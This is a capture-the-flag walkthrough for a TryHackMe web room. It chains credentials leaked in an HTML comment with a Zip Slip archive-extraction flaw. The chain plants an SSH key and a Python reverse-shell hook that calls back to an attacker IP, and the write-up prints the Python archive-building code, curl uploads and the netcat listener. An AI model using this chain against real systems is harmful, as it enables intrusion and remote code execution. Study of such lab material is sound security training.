# TryHackMe: The Hollow Shell — Walkthrough

**Room:** The Hollow Shell (Hacker Holidays — Day 10, The Byte Lotus Hotel)
**Category:** Web
**Difficulty:** Medium

You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.

---

## 1. Reading the Room Briefing First

> "The Byte Lotus beachfront lets guests personalise their in-room display by uploading a shell — a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is 'held to the room's ear' it plays its shore. Slip past what the portal forgets to check, and the shell answers with a shell of your own."

This briefing is doing double duty with the word "shell" — a literal seashell/ambiance upload feature, and the payoff being a literal reverse shell. Two words worth flagging immediately:

- **"Slip"** — a strong pointer toward **Zip Slip**, the classic vulnerability where a `.zip` archive's internal entry paths (e.g. `../../etc/passwd`) aren't sanitized before extraction, letting a crafted archive write files outside the intended extraction directory.
- **"What the portal forgets to check"** — the vulnerability is a missing validation step, not a logic flaw or injection point.

## 2. Recon

```bash
nmap -sV -sC -p22,5000 10.130.132.151
```

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
5000/tcp open  http    Gunicorn
|_http-title: Byte Lotus — Room Service
|_Requested resource was /login
```

Gunicorn on port 5000 means Python/Flask. The root redirects to `/login`, so an account is needed before we can reach the upload feature.

## 3. Hardcoded Credentials in Plain Sight

```bash
curl -s http://<TARGET_IP>:5000/login
```

The HTML source contains a comment IT clearly meant to remove before going live:

```html
<!--
  ───────────────────────────────────────────────────────────────
   Byte Lotus // internal display-manager portal
   New on the floor team? IT seeds every property with the same
   starter login until you set your own:
       user: concierge
       pass: StayNoticed2024!
   (rotate it from Settings on first sign-in — most people forget)
  ───────────────────────────────────────────────────────────────
-->
```

This is the room's own briefing made literal — "the kind of thing nobody thinks to check." Logging in:

```bash
curl -i -X POST http://<TARGET_IP>:5000/login \
  -d 'username=concierge&password=StayNoticed2024!' \
  -c cookies.txt
```

Returns a `302` to `/dashboard` with a session cookie set.

## 4. Mapping the Upload Feature

```bash
curl -s http://<TARGET_IP>:5000/dashboard -b cookies.txt
```

The dashboard explains the upload mechanic clearly:

> "Found something on the beach? Upload it as a **shell** (a `.zip` souvenir pack) to set the ambiance on the in-room tablets. Each shell must contain a **shell.json** manifest listing its assets (images, stylesheets)."
>
> "A shell may include optional **automation hooks** — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand."

Two important details for later: a `shell.json` manifest is required, and there's an "automation hooks" feature mentioned explicitly — worth remembering once Zip Slip is confirmed, since a write primitive plus an auto-executed hook mechanism is a very short path to RCE.

## 5. Confirming Zip Slip

**Important build note:** the standard `zip` CLI tool sanitizes/refuses `../` in entry names — it's not possible to craft a Zip Slip payload with it. The archive has to be built with Python's `zipfile` module directly, which writes whatever `arcname` string you give it, traversal sequences included.

A benign confirmation payload:

```python
import zipfile

with zipfile.ZipFile("slip_test.zip", "w") as zf:
    zf.writestr("shell.json", '{"name": "SlipTest", "assets": []}')
    zf.writestr("../slip_marker.txt", "ZIPSLIP_CONFIRMED")
```

```bash
curl -i -X POST http://<TARGET_IP>:5000/upload -b cookies.txt -F "shell=@slip_test.zip"
```

The dashboard's "Shells on display" list turned out to be a useful oracle here — it enumerates the contents of the shells directory directly, so a successful traversal write shows up as a new sibling entry:

```bash
curl -s http://<TARGET_IP>:5000/dashboard -b cookies.txt | grep -B1 'id">shells/'
```
```
<span class="name">SlipTest</span>
<span class="id">shells/7808e0aa5c97/</span>
...
<span class="name">slip_marker.txt</span>
<span class="id">shells/slip_marker.txt/</span>
```

`slip_marker.txt` landing as a sibling of the per-upload UUID folder confirms one `../` escapes exactly one directory level, and the extraction routine performs no path sanitization at all — Zip Slip confirmed. (Direct HTTP fetches of that file 404'd, since there's no static route serving arbitrary files from that directory — but the write itself is proven regardless of whether it's web-servable.)

## 6. Establishing a Write Primitive Deeper on Disk

With the vulnerability confirmed, the next step is figuring out how far the traversal can reach and where the app process actually has write permission. Extra `../` sequences beyond filesystem root are harmless on POSIX systems (they just clamp at `/`), so overshooting the depth is a safe way to probe without needing to calibrate exactly.

**Test — write into `/tmp/` (should always be writable):**
```python
zf.writestr("../../../../../../../../tmp/slip_deep_marker.txt", "DEEP_TRAVERSAL_OK")
```
Upload result: `302` — confirms deep traversal and the write primitive both work cleanly.

**Test — write into a candidate user's home directory:**
```python
zf.writestr(f"../../../../../../../../home/{USERNAME}/home_marker.txt", "HOME_EXISTS")
```

Running this against a shortlist of plausible usernames (`concierge`, `display`, `roomservice`, `room`, `byte`, `lotus`, `staff`, `worker`, `app`, `deploy`, `ubuntu`, `www-data`, `shell`, `beach`) and watching for `302` (home exists) vs. `500` (it doesn't) narrowed it down fast — `roomservice` was the only one that returned `302`.

**Test — write into `/etc/cron.d/` and `/root/.ssh/`:**
Both returned `500`. This told us the app process, while able to write into `/home/roomservice/`, does **not** run as root and can't reach system-privileged locations. Worth ruling out early rather than assuming broader access than what's actually there.

## 7. The SSH Dead End — and Why It's Thematic, Not a Bug

With the write primitive confirmed against `/home/roomservice/.ssh/authorized_keys`, planting an SSH key seemed like the obvious next step:

```python
zf.writestr(f"../../../../../../../../home/roomservice/.ssh/authorized_keys", PUBKEY + "\n")
```

The write succeeded (`302`), and SSH accepted the key — but:

```
Welcome to Ubuntu 24.04.4 LTS ...
This account is currently not available.
Connection to <TARGET_IP> closed.
```

`roomservice`'s login shell is set to something like `/usr/sbin/nologin`. SFTP was also tried as a fallback and failed for the same underlying reason (`Received message too long` — the nologin shell prints text before the SFTP binary handshake can start, breaking the protocol).

This is worth calling out rather than treating as wasted effort: an account that exists, accepts a planted key, but has **no functioning shell** is a fitting literal match for the room's own name — "The Hollow Shell." It's a strong signal that SSH access was never the intended final step, and that the real path runs through the application itself rather than around it.

## 8. The Real Path — the "Automation Hooks" Mechanism

Going back to the dashboard's own description — "automation hooks... the theme worker applies these for you shortly after" — the intended path was in front of us the whole time. Rather than a manifest field that gets interpreted inline (several JSON key/shape guesses like `"hooks": {"post_install": ...}` were tried and produced no observable effect, since uploads return `302` regardless of manifest validity, giving no direct feedback on whether a guess was even close), the actual mechanism turned out to be a **`hooks/` directory** — a sibling of the `shells/` folder — which the background "theme worker" process scans and auto-loads Python files from, functioning as a lightweight plugin system.

Combined with the already-confirmed Zip Slip primitive, planting a hook is straightforward: a shallow `../../` (much shallower than the depth needed to reach `/home/` or `/etc/`, since `hooks/` sits right next to `shells/` in the same parent directory) writes a `.py` file directly into that auto-loaded directory.

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("<ATTACKER_IP>", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

With a listener running:
```bash
nc -lvnp 4444
```

Upload:
```bash
curl -i -X POST http://<TARGET_IP>:5000/upload -b cookies.txt -F "shell=@reverse-shell.zip"
```

The theme worker picked up and executed the planted hook within seconds — a full interactive shell as `roomservice` landed on the listener.

## 9. Grabbing the Flag

```bash
roomservice@tryhackme-2404:/var/www/conch$ cd ..
roomservice@tryhackme-2404:~$ ls -la
```
```
-rw-r--r-- 1 root        root          30 Jun 22 12:00 flag.txt
```

```bash
cat flag.txt
```

Flag retrieved — root-owned but world-readable, sitting directly in `roomservice`'s home directory.

---

## Summary of the Chain

| Stage | Technique | Result |
|---|---|---|
| Recon | nmap → Gunicorn/Flask on port 5000 | Found a staff login portal |
| Access | Hardcoded credentials left in an HTML comment | Authenticated as `concierge` |
| Vulnerability discovery | Crafted a `.zip` with `zipfile` (not the `zip` CLI, which sanitizes traversal) containing a `../` entry | Confirmed Zip Slip — extraction performs no path sanitization |
| Depth/scope mapping | Wrote to `/tmp/`, probed a username shortlist against `/home/<user>/`, tested `/etc/cron.d/` and `/root/.ssh/` | Found `roomservice` as a real user; confirmed the app process is not root |
| Dead end (thematic) | Planted an SSH key in `/home/roomservice/.ssh/authorized_keys` | Key accepted, but the account's shell is `nologin` — no usable access |
| Real foothold | Used the dashboard's own "automation hooks" hint to locate a `hooks/` directory (sibling of `shells/`) auto-loaded by a background worker | Planted a Python reverse-shell hook via the same Zip Slip primitive |
| Payoff | Theme worker auto-executed the planted hook | Full shell as `roomservice` → flag |

**Key takeaway:** the room's central lesson is that a single Zip Slip write primitive is rarely valuable on its own — its value comes from *what else on the box will act on a file you can now place*. SSH access looked like the natural target and technically "worked" (key accepted) while still being a dead end by design (`nologin`), which is a good reminder to keep re-reading the application's own descriptions of its features (the dashboard told us about the hooks mechanism from the very first visit) rather than defaulting to the most familiar escalation path.

*(Flag intentionally omitted from this writeup — run the exploit yourself against your own instance to retrieve it.)*
